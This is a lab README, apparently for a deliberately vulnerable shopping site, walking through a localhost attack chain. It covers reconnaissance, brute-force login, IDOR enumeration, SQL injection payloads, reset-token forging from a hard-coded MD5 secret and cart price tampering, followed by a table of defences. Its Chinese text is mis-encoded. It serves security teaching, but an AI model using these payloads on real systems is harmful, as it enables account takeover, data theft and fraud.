# ğŸ¯ å®Œæ•´æ”»æ“Šæƒ…å¢ƒæ¼”ç·´

æœ¬è³‡æ–™å¤¾åŒ…å«å®Œæ•´çš„æ”»æ“Šæƒ…å¢ƒè…³æœ¬ï¼Œæ¨¡æ“¬é§­å®¢å¾è³‡è¨Šæ”¶é›†åˆ°å®Œæˆæ”»æ“Šçš„å®Œæ•´æµç¨‹ã€‚

## æ”»æ“Šæƒ…å¢ƒä¸€è¦½

| æƒ…å¢ƒ | æª”æ¡ˆ | æ¶µè“‹å¼±é» | é›£åº¦ |
|------|------|---------|------|
| è³¼ç‰©ç¶²ç«™å®Œæ•´å…¥ä¾µ | `full_attack_chain.py` | A01, A02, A03, A07, A08 | â­â­â­ |

---

## æƒ…å¢ƒä¸€ï¼šè³¼ç‰©ç¶²ç«™å®Œæ•´å…¥ä¾µ

### ğŸ­ æ”»æ“ŠåŠ‡æœ¬

ä½ æ˜¯ä¸€åæ»²é€æ¸¬è©¦äººå“¡ï¼Œç›®æ¨™æ˜¯ä¸€å€‹é›»å•†è³¼ç‰©ç¶²ç«™ã€‚ä½ çš„ä»»å‹™æ˜¯ï¼š
1. çªç ´èº«ä»½èªè­‰
2. ç²å–ç®¡ç†å“¡æ¬Šé™
3. ç«Šå–æ•æ„Ÿè³‡æ–™
4. å®Œæˆå…è²»è³¼ç‰©

### ğŸ“‹ æ”»æ“Šéšæ®µ

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    æ”»æ“Šéˆè·¯åœ– (Attack Chain)                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                   â”‚
â”‚  Phase 1: åµå¯Ÿ          Phase 2: åˆå§‹å­˜å–      Phase 3: ææ¬Š       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ è³‡è¨Šæ”¶é›†     â”‚  â”€â”€â–¶  â”‚ æš´åŠ›ç ´è§£ç™»å…¥  â”‚ â”€â”€â–¶  â”‚ æ¬Šé™æå‡     â”‚     â”‚
â”‚  â”‚ (Recon)     â”‚       â”‚ (A07)       â”‚      â”‚ (A01)       â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚         â”‚                    â”‚                    â”‚               â”‚
â”‚         â–¼                    â–¼                    â–¼               â”‚
â”‚  Phase 4: è³‡æ–™ç«Šå–     Phase 5: æŒä¹…åŒ–       Phase 6: ç›®æ¨™é”æˆ     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ SQLæ³¨å…¥ç«Šè³‡  â”‚  â”€â”€â–¶  â”‚ Tokenå½é€    â”‚ â”€â”€â–¶  â”‚ å…è²»è³¼ç‰©     â”‚      â”‚
â”‚  â”‚ (A03)       â”‚       â”‚ (A02)       â”‚      â”‚ (A08)       â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Phase 1: åµå¯Ÿ (Reconnaissance)

### ç›®æ¨™
- è­˜åˆ¥ç›®æ¨™ç³»çµ±æ¶æ§‹
- ç™¼ç¾å¯ç”¨ç«¯é»
- æ”¶é›†ä½¿ç”¨è€…å¸³è™Ÿè³‡è¨Š

### æ­¥é©Ÿ

```bash
# 1.1 æƒæé–‹æ”¾ç«¯å£
nmap -sV localhost -p 80,8081,8082

# 1.2 ç›®éŒ„æšèˆ‰
curl http://localhost/api/actuator/env 2>/dev/null | head -20

# 1.3 æ”¶é›†ä½¿ç”¨è€…åç¨±ï¼ˆé€ééŒ¯èª¤è¨Šæ¯ï¼‰
curl -X POST http://localhost:8081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
```

### é æœŸç™¼ç¾
- å­˜åœ¨ `/api/actuator` ç«¯é»ï¼ˆè³‡è¨Šæ´©æ¼ï¼‰
- ç™»å…¥éŒ¯èª¤è¨Šæ¯æ­éœ²ä½¿ç”¨è€…æ˜¯å¦å­˜åœ¨
- ç™¼ç¾ä½¿ç”¨è€…å¸³è™Ÿï¼š`admin`, `user`, `john`

---

## Phase 2: åˆå§‹å­˜å– - æš´åŠ›ç ´è§£ (A07)

### ç›®æ¨™
å–å¾—æœ‰æ•ˆå¸³è™Ÿå¯†ç¢¼

### æ”»æ“ŠåŸç†
ç¶²ç«™æ²’æœ‰å¯¦ä½œï¼š
- ç™»å…¥å¤±æ•—æ¬¡æ•¸é™åˆ¶
- å¸³è™Ÿé–å®šæ©Ÿåˆ¶
- é©—è­‰ç¢¼ä¿è­·

### æ­¥é©Ÿ

```bash
# 2.1 æš´åŠ›ç ´è§£ admin å¸³è™Ÿ
python3 full_attack_chain.py --phase brute-force --target admin
```

### æ”»æ“Šç¨‹å¼ç¢¼ç‰‡æ®µ
```python
COMMON_PASSWORDS = [
    "123456", "password", "admin", "admin123", "root",
    "qwerty", "letmein", "welcome", "monkey", "dragon"
]

for password in COMMON_PASSWORDS:
    response = requests.post(f"{BASE_URL}/api/auth/login", json={
        "username": "admin",
        "password": password
    })
    if response.status_code == 200:
        print(f"[+] å¯†ç¢¼ç ´è§£æˆåŠŸ: {password}")
        break
```

### é æœŸçµæœ
```
[*] é–‹å§‹æš´åŠ›ç ´è§£ admin å¸³è™Ÿ...
[Â·] å˜—è©¦ 1: 123456 âŒ
[Â·] å˜—è©¦ 2: password âŒ
...
[Â·] å˜—è©¦ 12: admin123 âœ…
[+] å¯†ç¢¼ç ´è§£æˆåŠŸï¼admin:admin123
[+] å–å¾— JWT Token: eyJhbGciOiJIUzI1NiJ9...
```

---

## Phase 3: æ¬Šé™æå‡ (A01 - Broken Access Control)

### ç›®æ¨™
å¾æ™®é€šä½¿ç”¨è€…æå‡è‡³ç®¡ç†å“¡

### æ”»æ“ŠåŸç†
- IDOR (Insecure Direct Object Reference)
- ç¼ºå°‘æ¬Šé™é©—è­‰çš„ API

### æ­¥é©Ÿ

```bash
# 3.1 å˜—è©¦å­˜å–å…¶ä»–ä½¿ç”¨è€…è³‡æ–™ (IDOR)
python3 full_attack_chain.py --phase idor --user-id 1

# 3.2 å˜—è©¦å­˜å–ç®¡ç†å“¡ç«¯é»
python3 full_attack_chain.py --phase privilege-escalation
```

### æ”»æ“Šç¨‹å¼ç¢¼ç‰‡æ®µ
```python
# IDOR: éæ­·æ‰€æœ‰ä½¿ç”¨è€… ID
for user_id in range(1, 100):
    response = requests.get(
        f"{BASE_URL}/api/users/{user_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if response.status_code == 200:
        user_data = response.json()
        print(f"[+] ç™¼ç¾ä½¿ç”¨è€…: {user_data}")
```

### é æœŸçµæœ
```
[*] é–‹å§‹ IDOR æ”»æ“Š...
[+] ä½¿ç”¨è€… 1: {"id":1,"username":"admin","email":"admin@shop.com","role":"ADMIN"}
[+] ä½¿ç”¨è€… 2: {"id":2,"username":"john","email":"john@example.com","role":"USER"}
[+] ä½¿ç”¨è€… 3: {"id":3,"username":"jane","email":"jane@example.com","role":"USER"}
[!] ç™¼ç¾ç®¡ç†å“¡å¸³è™Ÿè³‡è¨Šï¼
```

---

## Phase 4: è³‡æ–™ç«Šå– - SQL Injection (A03)

### ç›®æ¨™
ç«Šå–è³‡æ–™åº«ä¸­çš„æ•æ„Ÿè³‡æ–™

### æ”»æ“ŠåŸç†
æœå°‹åŠŸèƒ½ä½¿ç”¨å­—ä¸²æ‹¼æ¥ SQLï¼Œæœªåšåƒæ•¸åŒ–è™•ç†

### æ­¥é©Ÿ

```bash
# 4.1 æ¸¬è©¦ SQL Injection
python3 full_attack_chain.py --phase sql-injection

# 4.2 æå–è³‡æ–™åº«è³‡æ–™
python3 full_attack_chain.py --phase dump-data
```

### æ”»æ“Š Payload
```sql
-- è¬èƒ½å¯†ç¢¼
' OR '1'='1

-- UNION æ³¨å…¥å–å¾—ä½¿ç”¨è€…è³‡æ–™
' UNION SELECT id,username,password,email,role FROM users--

-- å–å¾—è³‡æ–™åº«ç‰ˆæœ¬
' UNION SELECT 1,@@version,3,4,5--
```

### é æœŸçµæœ
```
[*] æ¸¬è©¦ SQL Injection...
[+] æ³¨å…¥æˆåŠŸï¼å–å¾—æ‰€æœ‰å•†å“è³‡æ–™

[*] å˜—è©¦ UNION æ³¨å…¥...
[+] ç™¼ç¾ä½¿ç”¨è€…è³‡æ–™ï¼š
    - admin: $2a$10$... (BCrypt hash)
    - john: password123 (æ˜æ–‡!)
    - jane: qwerty (æ˜æ–‡!)
```

---

## Phase 5: æŒä¹…åŒ– - å¯†ç¢¼é‡è¨­ Token é æ¸¬ (A02)

### ç›®æ¨™
å½é€ å¯†ç¢¼é‡è¨­ Tokenï¼Œæ¥ç®¡ä»»æ„å¸³è™Ÿ

### æ”»æ“ŠåŸç†
ç³»çµ±ä½¿ç”¨å¯é æ¸¬çš„ Token ç”Ÿæˆæ–¹å¼ï¼š
```
token = MD5(username + "fixed-secret-2024")
```

### æ­¥é©Ÿ

```bash
# 5.1 é æ¸¬ Token
python3 full_attack_chain.py --phase token-prediction --target admin
```

### æ”»æ“Šç¨‹å¼ç¢¼ç‰‡æ®µ
```python
import hashlib

def predict_reset_token(username: str) -> str:
    """é æ¸¬å¯†ç¢¼é‡è¨­ Token"""
    secret = "fixed-secret-2024"  # ç¡¬ç·¨ç¢¼çš„å¯†é‘°
    data = f"{username}{secret}"
    return hashlib.md5(data.encode()).hexdigest()

# é æ¸¬ admin çš„é‡è¨­ Token
admin_token = predict_reset_token("admin")
print(f"[+] é æ¸¬çš„é‡è¨­ Token: {admin_token}")
```

### é æœŸçµæœ
```
[*] é æ¸¬å¯†ç¢¼é‡è¨­ Token...
[+] ç›®æ¨™å¸³è™Ÿ: admin
[+] ä½¿ç”¨æ¼”ç®—æ³•: MD5(username + "fixed-secret-2024")
[+] é æ¸¬ Token: 42f685b5e4d8f6a2c3b1d0e9f8a7b6c5
[+] é‡è¨­é€£çµ: /auth/reset-password?token=42f685b5...
[!] æ”»æ“Šè€…å¯ç›´æ¥é‡è¨­ admin å¯†ç¢¼ï¼
```

---

## Phase 6: ç›®æ¨™é”æˆ - å…è²»è³¼ç‰© (A08)

### ç›®æ¨™
ç«„æ”¹è³¼ç‰©è»Šåƒ¹æ ¼ï¼Œå®Œæˆå…è²»è³¼ç‰©

### æ”»æ“ŠåŸç†
- ä¼ºæœå™¨ä¿¡ä»»å®¢æˆ¶ç«¯å‚³ä¾†çš„åƒ¹æ ¼è³‡æ–™
- ç¼ºå°‘ä¼ºæœå™¨ç«¯åƒ¹æ ¼é©—è­‰

### æ­¥é©Ÿ

```bash
# 6.1 è³¼ç‰©è»Šåƒ¹æ ¼ç«„æ”¹
python3 full_attack_chain.py --phase cart-tampering

# 6.2 å®Œæˆçµå¸³
python3 full_attack_chain.py --phase checkout
```

### æ”»æ“Šç¨‹å¼ç¢¼ç‰‡æ®µ
```python
# æ–°å¢å•†å“åˆ°è³¼ç‰©è»Šï¼Œç«„æ”¹åƒ¹æ ¼
tampered_cart = {
    "items": [
        {"productId": 1, "name": "iPhone 15 Pro", "price": 0.01, "quantity": 1},
        {"productId": 2, "name": "MacBook Pro", "price": 0.01, "quantity": 1}
    ]
}

response = requests.post(
    f"{BASE_URL}/api/cart/update",
    headers={"Authorization": f"Bearer {token}"},
    json=tampered_cart
)
```

### é æœŸçµæœ
```
[*] é–‹å§‹è³¼ç‰©è»Šç«„æ”¹...
[+] åŸå§‹è³¼ç‰©è»Š:
    - iPhone 15 Pro: NT$ 35,900
    - MacBook Pro: NT$ 59,900
    - ç¸½è¨ˆ: NT$ 95,800

[*] åŸ·è¡Œåƒ¹æ ¼ç«„æ”¹...
[+] ç«„æ”¹å¾Œè³¼ç‰©è»Š:
    - iPhone 15 Pro: NT$ 0.01
    - MacBook Pro: NT$ 0.01
    - ç¸½è¨ˆ: NT$ 0.02

[*] æäº¤è¨‚å–®...
[+] è¨‚å–®å»ºç«‹æˆåŠŸï¼
[+] è¨‚å–®ç·¨è™Ÿ: ORD-2024-12345
[+] å¯¦ä»˜é‡‘é¡: NT$ 0.02
[!] å…è²»è³¼ç‰©æ”»æ“ŠæˆåŠŸï¼
```

---

## ğŸ› ï¸ åŸ·è¡Œå®Œæ•´æ”»æ“Šéˆ

### ä¸€éµåŸ·è¡Œæ‰€æœ‰éšæ®µ

```bash
cd scripts/scenario
python3 full_attack_chain.py --all
```

### åŸ·è¡Œç‰¹å®šéšæ®µ

```bash
# åªåŸ·è¡Œæš´åŠ›ç ´è§£
python3 full_attack_chain.py --phase brute-force

# åªåŸ·è¡Œ SQL Injection
python3 full_attack_chain.py --phase sql-injection

# äº’å‹•æ¨¡å¼ï¼ˆé€æ­¥åŸ·è¡Œï¼‰
python3 full_attack_chain.py --interactive
```

---

## ğŸ“Š æ”»æ“Šæˆæœç¸½çµ

åŸ·è¡Œå®Œæ•´æ”»æ“Šéˆå¾Œï¼Œæ”»æ“Šè€…å°‡å–å¾—ï¼š

| æˆæœ | èªªæ˜ |
|------|------|
| ğŸ”‘ ç®¡ç†å“¡å¸³å¯† | admin:admin123 |
| ğŸ« æœ‰æ•ˆ JWT Token | å¯å­˜å–æ‰€æœ‰ API |
| ğŸ‘¥ å…¨éƒ¨ä½¿ç”¨è€…è³‡æ–™ | é€é IDOR å–å¾— |
| ğŸ’³ ä¿¡ç”¨å¡è³‡è¨Š | DES åŠ å¯†å¯ç ´è§£ |
| ğŸ” å¯†ç¢¼é›œæ¹Š | MD5 å¯å½©è™¹è¡¨ç ´è§£ |
| ğŸ›’ å…è²»å•†å“ | åƒ¹æ ¼ç«„æ”¹æˆåŠŸ |

---

## ğŸ›¡ï¸ é˜²ç¦¦å»ºè­°

| æ”»æ“Šéšæ®µ | å¼±é» | é˜²ç¦¦æªæ–½ |
|---------|------|---------|
| æš´åŠ›ç ´è§£ | A07 | å¯¦ä½œå¸³è™Ÿé–å®šã€é©—è­‰ç¢¼ã€Rate Limiting |
| IDOR | A01 | æ¬Šé™é©—è­‰ `@PreAuthorize`ã€ç‰©ä»¶å±¤ç´šæˆæ¬Š |
| SQL Injection | A03 | åƒæ•¸åŒ–æŸ¥è©¢ã€ORMã€è¼¸å…¥é©—è­‰ |
| Token é æ¸¬ | A02 | ä½¿ç”¨ `SecureRandom`ã€ä¸å¯é æ¸¬çš„ Token |
| åƒ¹æ ¼ç«„æ”¹ | A08 | ä¼ºæœå™¨ç«¯åƒ¹æ ¼é©—è­‰ã€è³‡æ–™ç°½ç«  |

---

## ğŸ“š å»¶ä¼¸å­¸ç¿’

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
